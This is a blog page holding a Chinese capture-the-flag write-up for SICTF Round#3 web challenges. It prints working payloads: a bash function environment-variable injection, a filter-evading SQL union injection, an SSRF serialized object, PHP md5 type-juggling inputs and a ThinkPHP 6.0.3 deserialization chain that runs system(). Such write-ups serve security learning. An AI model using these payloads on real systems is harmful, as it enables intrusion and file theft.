@@ -1,0 +1,1064 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      SICTF Round#3 | Infernity&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="" />
+  <meta name="description" content="blog" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/I.png">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 59,
+      randomYouSrc: '/img/background/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: true,
+	  appId: 'AU8',
+	  appKey: '4cU',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「SICTF Round#3」
+		
+	</p>
+
+	
+	
+		<span id="star-button" rel="unlike">
+			<i class="icon-heart"></i>
+		</span>
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-Friends!">
+			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/img/qq.png" target="_blank">
+				<span class="icon-qq"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/img/weixin.jpg" target="_blank">
+				<span class="icon-weixin"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
+				<span class="icon-csdn"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2024/02/17/SICTF-Round3/" itemprop="url">
+		SICTF Round#3
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2024/02/17/SICTF-Round3/" itemprop="url">
+		<time datetime="2024-02-17T08:19:35.000Z" itemprop="dateUpdated">
+	  		2024-06-18
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/WPs/" class=" ">
+			WPs
+		</a>
+	
+		
+			</span>
+			
+			
+
+	
+    <span class="leancloud_visitors" id="/2024/02/17/SICTF-Round3/_visitors" data-url="/2024/02/17/SICTF-Round3/" data-title="SICTF Round#3">
+       	<i class="icon-eye"></i>
+       	热度
+        
+            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
+                   
+    </span>
+    
+
+
+
+	
+    <span class="leancloud_likes" id="/2024/02/17/SICTF-Round3/_likes" data-url="/2024/02/17/SICTF-Round3/" data-title="SICTF Round#3" rel="unlike">
+        <i class="icon-heart"></i>
+        喜欢
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+	
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<p>by:Infernity</p>
+<h1 id="100％-upload"><a href="#100％-upload" class="headerlink" title="100％_upload"></a>100％_upload</h1><p>可真气死我了这道题，没注意看url，跟着标题走，一直在文件上传，一直在绕过滤，他要过滤也不过滤全，留个.user.ini没过滤，就一直围绕这个想办法，结果……</p>
+<p><img src="/img/SICTF2024/1.png" alt="图片.png"></p>
+<p>打开题目，很明显的提示，index.php里有Include函数，那么我们直接上传一个jpg马，然后包含他就出来了。</p>
+<p><img src="/img/SICTF2024/2.png" alt="图片.png"></p>
+<p><strong>SICTF{ea391e30-b67e-4a5d-97ca-7c00f1bc107b}</strong> </p>
+<h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><p>新知识点，利用环境变量注入。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189733.html">https://www.cnblogs.com/h0cksr/p/16189733.html</a></p>
+<p>前面的反序列化这里不再赘述。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>=<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    worries&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome=<span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year=<span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year-&gt;last=<span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;^.<em>(worries).</em>$&#x2F;</p>
+<p>这个可以在前面加个空格绕过。</p>
+<p>主要是这一段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>
+
+<p>这里环境变量注入要看看上面的文章，有点复杂。</p>
+<p>这里直接get[BASH_FUNC_echo%%]&#x3D;() { cat &#x2F;f*; }</p>
+<p>即可拿到flag。</p>
+<h1 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h1><p>这道题考查sql无列名注入。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46230316/article/details/106668182">https://blog.csdn.net/m0_46230316/article/details/106668182</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)/**/as/**/a%23</span><br></pre></td></tr></table></figure>
+
+<p>过滤了空格，经过测试，一共有两列，而flag肯定在第二列，所以是<code>2</code></p>
+<p><strong>SICTF{4fa6acc5-9d2c-4af8-908c-53b66839b019}</strong></p>
+<h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><p>他说有另一个文件，直接开扫！找到一个admin.php，进去看看</p>
+<p><img src="/img/SICTF2024/3.png" alt="图片.png"></p>
+<p>意思是我们需要把ip改成127.0.0.1</p>
+<p>这里正好原文里给了curl</p>
+<p><img src="/img/SICTF2024/4.png" alt="图片.png"></p>
+<p>那直接以127.0.0.1开头进去就拿到flag了。</p>
+<p>O:6:”client”:1:{s:3:”url”;s:26:”<a target="_blank" rel="noopener" href="http://127.0.0.1/admin.php%22;%7D">http://127.0.0.1/admin.php&quot;;}</a></p>
+<p>最后base64解密</p>
+<p><img src="/img/SICTF2024/5.png" alt="图片.png"></p>
+<p><strong>SICTF{af8d34d5-22c4-414d-a78e-b65f587712f5}</strong></p>
+<h1 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h1><p>最讨厌藏东西的题了，开局先扫，扫出来一个<a target="_blank" rel="noopener" href="http://www.zip这是网站备份文件,里面会有源码,在app/controller/%E9%87%8C%E6%89%BE%E5%88%B0%E6%BA%90%E7%A0%81%EF%BC%8C%E5%AE%A1%E8%AE%A1%E6%BA%90%E7%A0%81%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AD%A5">www.zip这是网站备份文件，里面会有源码，在app/controller/里找到源码，审计源码，第一步</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$right</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;left&#x27;</span>];</span><br><span class="line"><span class="variable">$left</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;right&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$right</span> !== <span class="variable">$left</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$right</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$left</span>))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>传?left&#x3D;240610708&amp;right&#x3D;QLTHNDT</p>
+<p>第二步</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;603THINKPHP&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;！！！Oysters don&#x27;t want you to eat！！！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一般只有一个preg_match的判断，里面是一个die函数，用回溯次数绕过可以解，下面stripos函数需要我们的参数里有603THINKPHP，所以传一百万个a+603THINKPHP即可。</p>
+<p>第三步就是反序列化了，这是thinkphp6.0.3有现成的poc，在网上一搜第一个就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"> <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>];</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;&#125;</span><br><span class="line"> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+
+<p>post传参拿到flag</p>
+<p><strong>SICTF{c35c6cef-3fbb-41d3-9a53-1191b957a9f1}</strong></p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/background/2.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2024/02/20/Hgame-2024-week-4/" title="Hgame 2024 week 4" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2024/02/17/VNCTF%202024/" title="VNCTF 2024" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
+								NepCTF2024部分web			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								八月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里
+12if os.path.islink(new_file):    return &...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/nepctf2024/nepctf2024.png" alt="NepCTF2024部分web"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
+								2024第七届巅峰极客部分wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								八月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/dfjk/dfjk.png" alt="2024第七届巅峰极客部分wp"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">
+								2024春秋杯部分wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 6日, 2024				
+							</p>
+							<p class="relate-post-content">
+								brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架
+
+一眼ssti模版注入，
+1?name=&#123;&#123;g.pop.__globals__.__builtins__.__im...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024春秋杯/2024春秋杯.png" alt="2024春秋杯部分wp"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">
+								PolarCTF2024夏季个人挑战赛wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 10日, 2024				
+							</p>
+							<p class="relate-post-content">
+								扫扫看不用扫，猜测是flag.php
+
+
+flag{094c9cc14068a7d18ccd0dd3606e532f}
+
+debudaoflag在cookie里：
+
+
+flag{72077a55w312584wb1aaa88888cd...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛wp"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp">
+								PolarCTF2024春季个人挑战赛wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 30日, 2024				
+							</p>
+							<p class="relate-post-content">
+								机器人打开页面：
+
+一眼robots.txt
+123User-agent: *Disallow: /27f5e15b6af3223f1176293cd015771dFlag: flag&#123;4749ea1ea481a5d
+
+只有...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024春季个人挑战赛wp"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="第九届中国海洋大学信息安全竞赛web题解">
+								第九届中国海洋大学信息安全竞赛web题解			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 26日, 2024				
+							</p>
+							<p class="relate-post-content">
+								ezPHPparse_str()可以进行变量覆盖。
+全部流量包：
+
+菜狗工具#1python继承链攻击。
+1print(().__class__.__base__.__subclasses__()[132].__init__.__gl...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="第九届中国海洋大学信息安全竞赛web题解">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/第九届中国海洋大学信息安全竞赛web题解/blue-whale_logo.png" alt="第九届中国海洋大学信息安全竞赛web题解"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/" title="DASCTF2024校赛">
+								DASCTF2024校赛			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 20日, 2024				
+							</p>
+							<p class="relate-post-content">
+								cool_indexserver.js:
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/" title="DASCTF2024校赛">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/DASCTF2024校赛/2024dasctf.png" alt="DASCTF2024校赛"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/09/XYCTF2024/" title="XYCTF2024">
+								XYCTF2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 9日, 2024				
+							</p>
+							<p class="relate-post-content">
+								ezhttp打开是登录页面，先看源码，源码提示：
+1&lt;!-- 为了防止忘记密码，我把它们放在某个地方了 --&gt;
+
+第一反应是robots.txt，进去看看。
+
+得到&#x2F;l0g1n.txt，进入得到帐号密码：
+12u...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/09/XYCTF2024/" title="XYCTF2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="XYCTF2024"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/25/NKCTF2024/" title="NKCTF2024">
+								NKCTF2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								my first cmshttps://avd.aliyun.com/detail?id=AVD-2024-27622
+弱口令登录
+username : admin
+password : Admin123
+登录进去后：
+
+全世界最简单...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/25/NKCTF2024/" title="NKCTF2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/4.jpg" alt="NKCTF2024"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/19/DubheCTF-2024/" title="DubheCTF_2024">
+								DubheCTF_2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 19日, 2024				
+							</p>
+							<p class="relate-post-content">
+								师傅们太强了，跟师傅们打比赛能学到很多东西，我就作出来一个最简单的题&#x3D;-&#x3D;
+Master of Profile参考链接：https://cn-sec.com/archives/2105254.html想读配置文件，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/19/DubheCTF-2024/" title="DubheCTF_2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/28.jpg" alt="DubheCTF_2024"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
